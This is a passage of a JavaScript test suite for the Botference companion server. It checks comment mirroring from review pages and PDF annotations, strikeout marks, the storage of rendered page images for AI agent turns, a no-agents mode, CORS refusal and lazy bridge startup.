    await test('deleting the page takes its snapshot with it', async () => {
      await POST(sb, '/delete-page', { url: PAGE1 });
      assert.equal(store_hasSnapshot(snapDir, key), false);
      assert.equal((await GET(sb, `/a/${key}`, { ...R, cookie: guestCookie })).status, 404);
    });

    s.proc.kill();
  }

  {
    await test('--hosted without PLUGIN_PASSWORD refuses to start', async () => {
      const bare = tmpRoot('nopw');
      const proc = spawn(process.execPath, [SERVER, '--hosted'], {
        env: { ...process.env, PORT: '0', BOTFERENCE_PROJECT_ROOT: bare, PLUGIN_PASSWORD: '' },
        stdio: ['ignore', 'pipe', 'pipe'],
      });
      spawned.push(proc);
      let err = '';
      proc.stderr.on('data', d => { err += d; });
      const code = await new Promise(r => proc.on('exit', r));
      assert.equal(code, 1);
      assert.match(err, /--hosted requires PLUGIN_PASSWORD/);
    });
  }

  await test('a local companion answers no preflight and sets no CORS header', async () => {
    const r = await request(base, 'OPTIONS', '/reply', undefined, { origin: 'https://evil.test' });
    assert.equal(r.status, 404);
    assert.equal(r.headers['access-control-allow-origin'], undefined);
    const g = await GET(base, '/index');
    assert.equal(g.headers['access-control-allow-origin'], undefined, 'never in local mode');
  });

  // --- --no-agents ------------------------------------------------------
  await test('--no-agents persists the comment but refuses the summon', async () => {
    const offRoot = tmpRoot('noagents');
    const off = await startServer({ root: offRoot, args: ['--no-agents'] });
    const es = openEvents(off.base);
    await waitFor(() => es.events.some(e => e.type === 'hello'), 'sse hello (no-agents)');
    await POST(off.base, '/page', { url: PAGE1, title: TITLE1, site: 'ledger.test' });
    const r = await POST(off.base, '/thread', {
      url: PAGE1, quote: QUOTE1, prefix: '', suffix: '', msg: { text: '@claude thoughts?' },
    });
    assert.equal(r.json.ok, true);
    assert.equal(r.json.queued, false);
    assert.equal(r.json.reason, 'agents are off on this companion');
    const err = await waitFor(() => es.events.find(e => e.type === 'chat' && e.kind === 'error'), 'error event');
    assert.equal(err.url, PAGE1);
    assert.equal(err.target, r.json.thread.id);
    assert.match(err.error, /agents are off/);
    const health = await GET(off.base, '/health');
    assert.equal(health.json.bridge, 'disabled');
    const models = await GET(off.base, '/models');
    assert.deepEqual(models.json, { ok: true, current: null, options: null, status: null,
      effort: null, verbosity: 'short',
      keys: { claude: 'unset', codex: 'unset', modes: { claude: 'auto', codex: 'auto' } },
      bridge: 'disabled' });
    const effort = await POST(off.base, '/effort', { agent: 'claude', level: 'high' });
    assert.equal(effort.status, 409);
    const setModel = await POST(off.base, '/model', { agent: 'claude', model: 'claude-opus-5' });
    assert.equal(setModel.status, 409);
    assert.deepEqual(setModel.json, { ok: false, error: 'agents are off on this companion' });
    const relay = await POST(off.base, '/relay', { agent: 'both' });
    assert.equal(relay.status, 409);
    assert.deepEqual(relay.json, { ok: false, error: 'agents are off on this companion' });
    const page = (await GET(off.base, `/page?url=${encodeURIComponent(PAGE1)}`)).json;
    assert.equal(page.threads[0].msgs[0].text, '@claude thoughts?');
    es.close();
    off.proc.kill();
  });

  // --- the unified comment store ----------------------------------------
  // A visitor with no extension comments in a review page's OWN margin. Those
  // comments are projected into this record (POST /review-comments) so the
  // owner, the bots, send review and the export see one conversation rather
  // than two. The projection is a mirror and must therefore be idempotent:
  // the review server re-posts a page whenever anything on it changes.
  const REVIEW_URL = 'https://paper.example/01-introduction.html';
  const RC1 = 'user-01-introduction-blk-3-1756000000000';
  const RC2 = 'user-01-introduction-blk-9-1756000009999';
  const RC_BLOCK = 'user-01-introduction-doc-1756000005555';
  const rcPage = async () =>
    (await GET(base, `/page?url=${encodeURIComponent(REVIEW_URL)}`)).json;
  const mirror = (comments, extra = {}) =>
    POST(base, '/review-comments', { url: REVIEW_URL, title: 'Introduction', ...extra, comments });

  await test('a visitor\'s review-page comment lands as a Discuss thread, under their name', async () => {
    const r = await mirror([{
      id: RC1, author: 'mira', ts: '2026-08-20T09:00:00.000Z',
      quote: 'the sleeper network never really went away',
      prefix: 'In the last decade ', suffix: ' — the timetables say so',
      text: 'This overstates it. The Austrian service is the exception.',
    }]);
    assert.equal(r.status, 200);
    assert.equal(r.json.created, 1);
    const p = await rcPage();
    assert.equal(p.threads.length, 1);
    const t = p.threads[0];
    assert.equal(t.quote, 'the sleeper network never really went away');
    assert.equal(t.prefix, 'In the last decade ');
    assert.equal(t.suffix, ' — the timetables say so');
    assert.deepEqual(t.origin, { system: 'review', id: RC1 },
      'filed under the address it came from — that is what makes the mirror idempotent');
    assert.equal(t.msgs.length, 1);
    assert.equal(t.msgs[0].author, 'mira', 'authorship survives the crossing');
    assert.equal(t.msgs[0].ts, '2026-08-20T09:00:00.000Z',
      '…and so does the moment it was written, not the moment we heard about it');
    assert.equal(r.json.threads[RC1], t.id, 'the mirror is told where its comment went');
  });

  await test('mirroring the same comment again is not a second comment', async () => {
    const again = await mirror([{
      id: RC1, author: 'mira', ts: '2026-08-20T09:00:00.000Z',
      quote: 'the sleeper network never really went away',
      text: 'This overstates it. The Austrian service is the exception.',
    }]);
    assert.equal(again.json.created, 0);
    assert.equal(again.json.appended, 0);
    assert.equal((await rcPage()).threads.length, 1, 'one comment, one thread, however often it is mirrored');
  });

  await test('a reply left over there lands here once, and marks the thread as theirs again', async () => {
    const withReply = c => mirror([{ ...c, replies: [
      { author: 'mira', ts: '2026-08-20T10:15:00.000Z', text: 'Checked the timetable — I still think so.' },
    ] }]);
    const c = { id: RC1, author: 'mira', ts: '2026-08-20T09:00:00.000Z',
      quote: 'the sleeper network never really went away',
      text: 'This overstates it. The Austrian service is the exception.' };
    const first = await withReply(c);
    assert.equal(first.json.appended, 1);
    const second = await withReply(c);
    assert.equal(second.json.appended, 0, 'a reply is its author and its timestamp: it lands once');
    const t = (await rcPage()).threads[0];
    assert.equal(t.msgs.length, 2);
    assert.equal(t.msgs[1].text, 'Checked the timetable — I still think so.');
    assert.deepEqual(t.msgs[1].origin, { system: 'review', id: RC1 },
      'marked as mirrored, which is what stops the read-back sending it home again');
  });

  await test('a comment on the document as a whole goes to page chat, not onto an anchor', async () => {
    const r = await mirror([{
      id: RC_BLOCK, author: 'devraj', ts: '2026-08-20T11:00:00.000Z',
      quote: '', text: 'Reads well overall. The structure is the thing I would change.',
    }]);
    assert.equal(r.json.created, 1);
    assert.equal(r.json.threads[RC_BLOCK], '__page__');
    const p = await rcPage();
    assert.equal(p.threads.length, 1, 'no anchorless thread was minted — that would only be an orphan');
    const m = p.page_chat[p.page_chat.length - 1];
    assert.equal(m.author, 'devraj');
    assert.deepEqual(m.origin, { system: 'review', id: RC_BLOCK });
    const again = await mirror([{ id: RC_BLOCK, author: 'devraj', quote: '', text: 'Reads well overall.' }]);
    assert.equal(again.json.created, 0, '…and it too lands only once');
  });

  await test('filing over there files here; reopening HERE is never undone by the mirror', async () => {
    const c = { id: RC2, author: 'sam-w', ts: '2026-08-20T12:00:00.000Z',
      quote: 'the timetables say so', text: 'Source for this?' };
    await mirror([c]);
    const id = (await rcPage()).threads.find(t => t.origin.id === RC2).id;
    await mirror([{ ...c, resolved: true }]);
    assert.equal((await rcPage()).threads.find(t => t.origin.id === RC2).resolved, true);
    // the reader disagrees, here, with a click
    await POST(base, '/resolve', { url: REVIEW_URL, thread_id: id, resolved: false });
    await mirror([{ ...c, resolved: true }]);
    assert.equal((await rcPage()).threads.find(t => t.origin.id === RC2).resolved, undefined,
      'resolving travels one way: a stale review record must not close a thread the reader reopened');
  });

  await test('the projection summons only when it is asked to, and the mention is what summons', async () => {
    const quiet = await mirror([{
      id: 'user-quiet-1', author: 'mira', quote: 'a quiet claim',
      text: '@claude is this right?',
    }]);
    assert.equal(quiet.json.created, 1);
    assert.deepEqual(quiet.json.refusals, []);
    const noted = await mirror([{
      id: 'user-noted-1', author: 'mira', quote: 'a note to nobody',
      text: 'just parking a thought here', summon: true,
    }], { summon: true });
    assert.equal(noted.json.created, 1);
    const asked = await mirror([{
      id: 'user-asked-1', author: 'mira', quote: 'the second half',
      text: '@claude what is the source?',
    }], { summon: true });
    assert.equal(asked.json.created, 1);
    const t = await waitFor(async () => {
      const p = await rcPage();
      const hit = p.threads.find(x => x.origin && x.origin.id === 'user-asked-1');
      return hit && hit.msgs.length > 1 ? hit : null;
    }, 'the bot to answer the mirrored mention');
    assert.match(String(t.msgs[t.msgs.length - 1].author), /^claude/);
    const p = await rcPage();
    assert.equal(p.threads.find(x => x.origin.id === 'user-quiet-1').msgs.length, 1,
      'a paper that runs its own bridge answers there; summoning here too would say one thing twice');
    assert.equal(p.threads.find(x => x.origin.id === 'user-noted-1').msgs.length, 1,
      'and a note that tags nobody summons nobody, exactly as it does in the drawer');
  });

  await test('a mirrored comment is an ordinary thread everywhere else', async () => {
    const t = (await rcPage()).threads[0];
    // it replies, resolves and exports like any other — nothing downstream
    // asks whether a thread was written here or projected into here
    const reply = await POST(base, '/reply', { url: REVIEW_URL, thread_id: t.id, text: 'Fair. Softening it.' });
    assert.equal(reply.status, 200);
    const after = (await rcPage()).threads[0];
    assert.equal(after.msgs[after.msgs.length - 1].text, 'Fair. Softening it.');
    assert.equal(after.msgs[after.msgs.length - 1].origin, undefined,
      'a reply written HERE carries no origin — that is how the read-back knows to send it over');
  });

  await test('a projection with nothing usable in it changes nothing', async () => {
    const before = (await rcPage()).threads.length;
    const junk = await mirror([
      { id: '', author: 'mira', quote: 'x', text: 'no id' },
      { id: 'user-x', author: '', quote: 'x', text: 'no author' },
      { id: 'user-y', author: 'mira', quote: 'x', text: '   ' },
      { id: 'user-z', author: 'mira', quote: 'x', text: 'ok', origin: { system: 'invented' } },
    ]);
    assert.equal(junk.json.skipped, 3);
    assert.equal((await rcPage()).threads.length, before + 1, 'only the well-formed one was filed');
    assert.equal((await POST(base, '/review-comments', { url: REVIEW_URL, comments: [] })).status, 400);
    assert.equal((await POST(base, '/review-comments', { comments: [{ id: 'a' }] })).status, 400);
  });

  // --- the comments the PDF arrived with ---------------------------------
  // Same store, other system. The viewer reads a manuscript's Acrobat
  // highlights and Preview notes and offers them; accepting posts them here.
  // Everything that makes it safe to press twice is `origin`, exactly as it is
  // for the review mirror — so that is what these drive.
  const PDF_URL = 'bfp-pdf://text/' + 'c'.repeat(64);
  const A1 = '9f2b1c4d5e6f7a8b';
  const A2 = '1a2b3c4d5e6f7081';
  const A3 = 'ffeeddccbbaa9988';
  const pdfPage = async () =>
    (await GET(base, `/page?url=${encodeURIComponent(PDF_URL)}`)).json;
  const importAnnots = (annots, extra = {}) =>
    POST(base, '/pdf-annotations', { url: PDF_URL, title: 'adriana manuscript v4',
      site: 'local pdf', kind: 'pdf', file_name: 'adriana-manuscript-v4.pdf', ...extra, annots });

  await test('an Acrobat highlight becomes a thread, in the name of whoever wrote it', async () => {
    const r = await importAnnots([{
      id: A1, page: 3, author: 'adril', ts: '2026-08-20T18:06:06.000Z',
      quote: 'deploy and commit', prefix: 'the spacecraft will ', suffix: ' to the target',
      text: 'I agree that “deploy and commit” sounded very LLM-like.',
      kind: 'Highlight',
    }]);
    assert.equal(r.status, 200);
    assert.equal(r.json.created, 1);
    const p = await pdfPage();
    assert.equal(p.threads.length, 1);
    const t = p.threads[0];
    assert.equal(t.quote, 'deploy and commit');
    assert.equal(t.prefix, 'the spacecraft will ');
    assert.equal(t.page, 3, 'the page of the document, which is half of what a PDF quote means');
    assert.deepEqual(t.origin, { system: 'pdf-annot', id: A1 });
    assert.equal(t.msgs[0].author, 'adril', 'the annotation’s /T is the author');
    assert.equal(t.msgs[0].ts, '2026-08-20T18:06:06.000Z', '…and its /M is the moment');
    assert.equal(r.json.threads[A1], t.id);
    assert.equal(p.file_name, 'adriana-manuscript-v4.pdf', 'the record is made if it did not exist');
  });

  await test('re-opening the PDF offers nothing: the same annotation is the same thread', async () => {
    const again = await importAnnots([{
      id: A1, page: 3, author: 'adril', ts: '2026-08-20T18:06:06.000Z',
      quote: 'deploy and commit', text: 'I agree that “deploy and commit” sounded very LLM-like.',
    }]);
    assert.equal(again.json.created, 0);
    assert.equal((await pdfPage()).threads.length, 1);
  });

  await test('Acrobat’s own reply chain lands under its parent, once', async () => {
    const withReply = () => importAnnots([{
      id: A1, page: 3, author: 'adril', ts: '2026-08-20T18:06:06.000Z',
      quote: 'deploy and commit', text: 'I agree that “deploy and commit” sounded very LLM-like.',
      replies: [{ id: A2, author: 'angadh', ts: '2026-08-21T09:00:00.000Z', text: 'Renamed it.' }],
    }]);
    assert.equal((await withReply()).json.appended, 1);
    assert.equal((await withReply()).json.appended, 0, 'a reply carries its own id, and lands once');
    const t = (await pdfPage()).threads[0];
    assert.equal(t.msgs.length, 2);
    assert.equal(t.msgs[1].author, 'angadh');
    assert.deepEqual(t.msgs[1].origin, { system: 'pdf-annot', id: A2 });
  });

  await test('an edited annotation is a NEW comment, and the old thread stands', async () => {
    // the id is a hash of what the comment IS (annots.js), so editing it in
    // Acrobat makes a different one. The thread already here may hold a bot's
    // answer by now, and that answer does not belong to the edited sentence.
    const r = await importAnnots([{
      id: A3, page: 3, author: 'adril', ts: '2026-08-22T18:06:06.000Z',
      quote: 'deploy and commit', text: 'On reflection: “deploy and secure”.',
    }]);
    assert.equal(r.json.created, 1);
    const p = await pdfPage();
    assert.equal(p.threads.length, 2, 'two comments, because two things were said');
    assert.equal(p.threads[0].msgs.length, 2, 'and the first one is untouched');
  });

  await test('a sticky note with nothing near it goes to page chat, not to an orphan', async () => {
    const r = await importAnnots([{
      id: 'aaaabbbbccccdddd', page: 18, author: 'adril', ts: '2026-08-20T19:11:32.000Z',
      quote: '', text: 'The whole appendix needs renumbering.',
    }]);
    assert.equal(r.json.created, 1);
    const p = await pdfPage();
    const m = p.page_chat[p.page_chat.length - 1];
    assert.equal(m.text, 'The whole appendix needs renumbering.');
    assert.deepEqual(m.origin, { system: 'pdf-annot', id: 'aaaabbbbccccdddd' });
    assert.equal((await importAnnots([{ id: 'aaaabbbbccccdddd', page: 18, author: 'adril',
      quote: '', text: 'The whole appendix needs renumbering.' }])).json.created, 0,
    'and it too lands once');
  });

  await test('an imported thread is an ORDINARY thread everywhere else', async () => {
    const t = (await pdfPage()).threads[0];
    const reply = await POST(base, '/reply', { url: PDF_URL, thread_id: t.id, text: 'Fixed in v5.' });
    assert.equal(reply.status, 200);
    const after = (await pdfPage()).threads[0];
    const last = after.msgs[after.msgs.length - 1];
    assert.equal(last.text, 'Fixed in v5.');
    assert.equal(last.origin, undefined,
      'a reply written HERE carries no origin — it is not in the file, and the export knows it');
    const res = await POST(base, '/resolve', { url: PDF_URL, thread_id: t.id, resolved: true });
    assert.equal(res.status, 200);
  });

  await test('nothing summons a bot: an imported comment is somebody else’s remark', async () => {
    const before = (await pdfPage()).session_id;
    const r = await importAnnots([{
      id: '0011223344556677', page: 4, author: 'adril', ts: '2026-08-20T18:06:06.000Z',
      quote: 'the tumbling target', text: '@claude is this rate plausible?',
    }]);
    assert.equal(r.json.created, 1);
    assert.equal((await pdfPage()).session_id, before,
      'an @-mention inside somebody else’s annotation does not spend a turn on import');
  });

  // --- the mark: what was DONE to the passage ---------------------------
  // Adobe's two tools. A highlight says "look at this"; a strikeout says "this
  // should go". The file already knows which — /StrikeOut and /Squiggly are
  // deletions — and Discuss keeps the distinction rather than flattening every
  // markup into one yellow thread.
  await test('a StrikeOut in the file comes in struck', async () => {
    const r = await importAnnots([{
      id: 'abcd0000abcd0001', page: 5, author: 'adril', ts: '2026-08-20T18:06:06.000Z',
      quote: 'Nobody at the club disputed it', text: 'Cut this — it is not supported.',
      kind: 'StrikeOut',
    }]);
    assert.equal(r.json.created, 1);
    const t = (await pdfPage()).threads.find(x => x.origin && x.origin.id === 'abcd0000abcd0001');
    assert.equal(t.mark, 'strike');
  });

  await test('…and a Squiggly, which means the same thing to whoever drew it', async () => {
    await importAnnots([{ id: 'abcd0000abcd0002', page: 5, author: 'adril',
      quote: 'one week at a time', text: 'garbled', kind: 'Squiggly' }]);
    const t = (await pdfPage()).threads.find(x => x.origin && x.origin.id === 'abcd0000abcd0002');
    assert.equal(t.mark, 'strike');
  });

  await test('a Highlight and an Underline stay highlights, and carry no mark at all', async () => {
    await importAnnots([{ id: 'abcd0000abcd0003', page: 5, author: 'adril',
      quote: 'structural failure of oversight', text: 'look at this', kind: 'Underline' }]);
    const p = await pdfPage();
    const t = p.threads.find(x => x.origin && x.origin.id === 'abcd0000abcd0003');
    assert.equal(t.mark, undefined, 'nothing is written for the default — nothing to migrate');
    const first = p.threads.find(x => x.origin && x.origin.id === A1);
    assert.equal(first.mark, undefined, 'and the Highlight imported before any of this existed still reads back');
  });

  await test('a thread struck by hand is struck in the record', async () => {
    const r = await POST(base, '/thread', { url: PDF_URL, quote: 'the tumbling target',
      prefix: '', suffix: '', mark: 'strike', msg: { text: 'This sentence should come out.' } });
    assert.equal(r.status, 200);
    assert.equal(r.json.thread.mark, 'strike');
    const t = (await pdfPage()).threads.find(x => x.id === r.json.thread.id);
    assert.equal(t.mark, 'strike');
  });

  await test('a strikeout needs no words: the line through the passage IS the message', async () => {
    const r = await POST(base, '/thread', { url: PDF_URL, quote: 'kept doing what they had been doing',
      mark: 'strike', msg: { text: '' } });
    assert.equal(r.status, 200);
    assert.equal(r.json.thread.mark, 'strike');
    assert.equal(r.json.thread.msgs[0].text, '');
    assert.equal(r.json.thread.msgs[0].author, 'angadh', 'and it is still signed');
  });

  await test('…while an empty HIGHLIGHT still says nothing and is still refused', async () => {
    assert.equal((await POST(base, '/thread',
      { url: PDF_URL, quote: 'the tumbling target', msg: { text: '   ' } })).status, 400);
    assert.equal((await POST(base, '/thread',
      { url: PDF_URL, quote: 'the tumbling target', mark: 'highlight', msg: { text: '' } })).status, 400);
  });

  await test('an unknown mark is a highlight, not an error', async () => {
    const r = await POST(base, '/thread', { url: PDF_URL, quote: 'a rate plausible enough',
      mark: 'wavy', msg: { text: 'ordinary comment' } });
    assert.equal(r.status, 200);
    assert.equal(r.json.thread.mark, undefined);
  });

  await test('striking a passage you had already highlighted is a second, different comment', async () => {
    const body = { url: PDF_URL, quote: 'the same passage twice', msg: { text: 'same words' } };
    const a = await POST(base, '/thread', body);
    const b = await POST(base, '/thread', body);
    assert.equal(b.json.deduped, true, 'same act, seconds apart, is one comment');
    const c = await POST(base, '/thread', { ...body, mark: 'strike' });
    assert.ok(!c.json.deduped, 'but striking it is not the same act');
    assert.notEqual(c.json.thread.id, a.json.thread.id);
    assert.equal(c.json.thread.mark, 'strike');
  });

  await test('a malformed annotation is skipped, not half-filed', async () => {
    const before = (await pdfPage()).threads.length;
    const junk = await importAnnots([
      { id: '', page: 1, author: 'adril', quote: 'x', text: 'no id' },
      { id: '!!!!', page: 1, author: 'adril', quote: 'x', text: 'an id of nothing but punctuation' },
      { id: '9999888877776666', page: 1, author: 'adril', quote: 'x', text: '   ' },
      { id: '5555444433332222', page: 1, author: 'adril', quote: 'x', text: 'this one is fine' },
    ]);
    assert.equal(junk.json.created, 1);
    assert.equal(junk.json.skipped, 3);
    assert.equal((await pdfPage()).threads.length, before + 1);
    assert.equal((await POST(base, '/pdf-annotations', { url: PDF_URL, annots: [] })).status, 400);
    assert.equal((await POST(base, '/pdf-annotations', { annots: [{ id: A1 }] })).status, 400);
  });

  // --- the picture of a page: the half of a document that is not text -----
  // A figure is in no extract. The viewer renders the page and posts it here;
  // the turn names the file and the CLI opens it. What is driven: the door
  // (owner-only, capped, an image and not merely a name ending in .png), the
  // content key (a re-capture writes nothing), and the three states the
  // envelope can be in — the picture is there, it could have been there and is
  // not, or this turn is about no page at all.
  const IMG_URL = 'bfp-pdf://text/' + 'd'.repeat(64);
  const IMG_KEY = crypto.createHash('sha1').update(IMG_URL).digest('hex');
  const SNAP_DIR = path.join(root, '.botference', 'plugin', 'snapshots');
  const PNG_RED = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAADElEQVR4nGP4z8AAAAMBAQDJ/pLvAAAAAElFTkSuQmCC';
  const PNG_BLUE = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAADElEQVR4nGNgYPgPAAEDAQAIicLsAAAAAElFTkSuQmCC';
  const imgFile = n => path.join(SNAP_DIR, `${IMG_KEY}-p${n}.png`);

  await test('a rendered page is stored beside the snapshot, and a re-capture writes nothing', async () => {
    await POST(base, '/page', { url: IMG_URL, title: 'A Paper With Figures', site: 'local pdf', kind: 'pdf' });
    const first = await POST(base, '/page-image', { url: IMG_URL, page: 4, data: PNG_RED });
    assert.equal(first.status, 200);
    assert.equal(first.json.stored, true);
    assert.equal(first.json.path, imgFile(4), 'named by page, beside the snapshot');
    assert.ok(fs.existsSync(imgFile(4)), 'the picture really is on disk');
    assert.equal(fs.readFileSync(imgFile(4)).slice(1, 4).toString(), 'PNG', 'and it is a PNG');
    const mtime = fs.statSync(imgFile(4)).mtimeMs;
    const again = await POST(base, '/page-image', { url: IMG_URL, page: 4, data: PNG_RED });
    assert.equal(again.json.stored, false, 'the same page rendered again is a no-op');
    assert.equal(again.json.unchanged, true);
    assert.equal(fs.statSync(imgFile(4)).mtimeMs, mtime, 'the file was not rewritten');
    // …but a page that CHANGED is replaced: this is a cache of the document as
    // it is now, exactly as a snapshot is
    const moved = await POST(base, '/page-image', { url: IMG_URL, page: 4, data: PNG_BLUE });
    assert.equal(moved.json.stored, true);
    assert.equal(fs.readFileSync(imgFile(4)).toString('base64'), PNG_BLUE);
    // a data: url, which is what canvas.toDataURL hands the extension
    const asDataUrl = await POST(base, '/page-image',
      { url: IMG_URL, page: 5, data: `data:image/png;base64,${PNG_RED}` });
    assert.equal(asDataUrl.json.stored, true);
    assert.ok(fs.existsSync(imgFile(5)));
  });

  await test('the door refuses a non-image, an oversized page, an unknown page and a guest', async () => {
    const notAnImage = await POST(base, '/page-image',
      { url: IMG_URL, page: 6, data: Buffer.from('<html>not a figure</html>').toString('base64') });
    assert.equal(notAnImage.status, 400);
    assert.deepEqual(notAnImage.json, { ok: false, error: 'not a PNG or JPEG' });
    const huge = await POST(base, '/page-image',
      { url: IMG_URL, page: 6, data: Buffer.alloc(5 * 1024 * 1024).toString('base64') });
    assert.equal(huge.status, 200);
    assert.equal(huge.json.stored, false);
    assert.equal(huge.json.reason, 'page image too large');
    assert.ok(!fs.existsSync(imgFile(6)), 'nothing refused ever lands on disk');
    assert.equal((await POST(base, '/page-image', { url: IMG_URL, data: PNG_RED })).status, 400);
    assert.equal((await POST(base, '/page-image', { url: IMG_URL, page: 0, data: PNG_RED })).status, 400);
    assert.equal((await POST(base, '/page-image', { url: IMG_URL, page: 2, data: '' })).status, 400);
    assert.equal((await POST(base, '/page-image',
      { url: 'https://nowhere.test/none', page: 1, data: PNG_RED })).status, 404);
  });

  await test('a turn on a captured page names the image; one on an uncaptured page says so', async () => {
    // page 4 has a picture (above); page 9 has none
    const from = inputs(logFile).length;
    const seen = await POST(base, '/thread', {
      url: IMG_URL, quote: 'Figure 3: drift by cohort', prefix: '', suffix: '', page: 4,
      msg: { text: '@claude what does this plot actually show?' },
    });
    assert.equal(seen.json.queued, true);
    const turn = await waitFor(() => inputs(logFile).slice(from).find(t => t.startsWith('@claude ')), 'the turn');
    assert.ok(turn.includes(`A rendered image of page 4 of this document is on this machine, at ${imgFile(4)}`),
      'the image is named by absolute path');
    assert.ok(turn.includes('claude: the Read tool; codex: view_image'),
      'and each bot is told the verb its own CLI has');
    assert.ok(turn.includes('never infer'), 'with the instruction not to answer from the caption');

    const from2 = inputs(logFile).length;
    await POST(base, '/thread', {
      url: IMG_URL, quote: 'Figure 9: the apparatus', prefix: '', suffix: '', page: 9,
      msg: { text: '@claude and this one?' },
    });
    const blind = await waitFor(() => inputs(logFile).slice(from2).find(t => t.startsWith('@claude ')), 'the blind turn');
    assert.ok(blind.includes('No rendered image of page 9 is available'),
      'a page that was never captured is said out loud, not passed over in silence');
    assert.ok(blind.includes('say plainly that you cannot see it'));
    assert.ok(!blind.includes(imgFile(4)), 'and no other page\'s picture is offered in its place');
  });

  await test('page chat on a document with pictures is told which pages have them', async () => {
    const from = inputs(logFile).length;
    await POST(base, '/reply', { url: IMG_URL, thread_id: '__page__', text: '@claude what is in figure 3?' });
    const turn = await waitFor(() => inputs(logFile).slice(from).find(t => t.startsWith('@claude ')), 'the page-chat turn');
    assert.ok(turn.includes('Rendered images of some of this document\'s pages'), 'the list rides page chat');
    assert.ok(turn.includes(`page 4: ${imgFile(4)}`) && turn.includes(`page 5: ${imgFile(5)}`),
      'naming every page that has one');
    assert.ok(!turn.includes('No rendered image of page'), 'page chat sits on no page, so nothing is missing');
  });

  await test('an ARTICLE says nothing about figures either way', async () => {
    const url = 'https://ledger.test/2026/plain-article';
    await POST(base, '/page', { url, title: 'A Plain Article', site: 'ledger.test' });
    const from = inputs(logFile).length;
    await POST(base, '/thread', { url, quote: 'a plain passage', prefix: '', suffix: '', page: 2,
      msg: { text: '@claude a plain question' } });
    const turn = await waitFor(() => inputs(logFile).slice(from).find(t => t.startsWith('@claude ')), 'the article turn');
    assert.ok(!turn.includes('rendered image'), 'no page-vision line on a page that is not a document');
    assert.ok(!turn.includes('No rendered image'), 'and no apology for one either');
  });

  await test('deleting the page takes its pictures with it', async () => {
    assert.ok(fs.existsSync(imgFile(4)) && fs.existsSync(imgFile(5)));
    const r = await POST(base, '/delete-page', { url: IMG_URL });
    assert.equal(r.status, 200);
    assert.ok(!fs.existsSync(imgFile(4)) && !fs.existsSync(imgFile(5)),
      'a picture of a page of a deleted document is nobody\'s');
  });

  // --- real config, no mock: the bridge must stay lazy ------------------
  await test('a server with the real bridge config serves /health and /test-page without spawning it', async () => {
    const realRoot = tmpRoot('real');
    const real = await startServer({ root: realRoot });
    const health = await GET(real.base, '/health');
    assert.deepEqual(health.json, { ok: true, bridge: 'stopped', queue: 0, queues: [],
      bridges: { live: 1, max: 1, workspace: 0, blog: 0 } });
    // a relay with nothing running must refuse rather than spawn the bridge
    const relay = await POST(real.base, '/relay', { agent: 'claude' });
    assert.equal(relay.status, 409);
    assert.deepEqual(relay.json, { ok: false, error: 'agents are idle — nothing to relay' });
    assert.equal((await GET(real.base, '/health')).json.bridge, 'stopped', 'still no bridge');
    const page = await GET(real.base, '/test-page');
    assert.equal(page.status, 200);
    assert.ok(page.body.includes('<h1>The Quiet Return of the Night Train</h1>'));
    assert.ok(page.body.includes('og:title'));
    assert.ok(fs.existsSync(path.join(realRoot, '.botference', 'plugin', 'config.json')),
      'config.json is created with defaults on first run');
    assert.ok(!/bridge/i.test(real.out().replace(/[^\n]*companion live[^\n]*/g, '')), 'no bridge chatter');
    real.proc.kill();
  });

  stream.close();
  cleanup();
  console.log(`\n${passed()} passed, ${failures().length} failed`);
  if (failures().length) { console.log(`failed: ${failures().join(', ')}`); process.exit(1); }
}

main().catch(e => {
  console.error(e);
  for (const p of spawned) { try { p.kill(); } catch { } }
  process.exit(1);
});
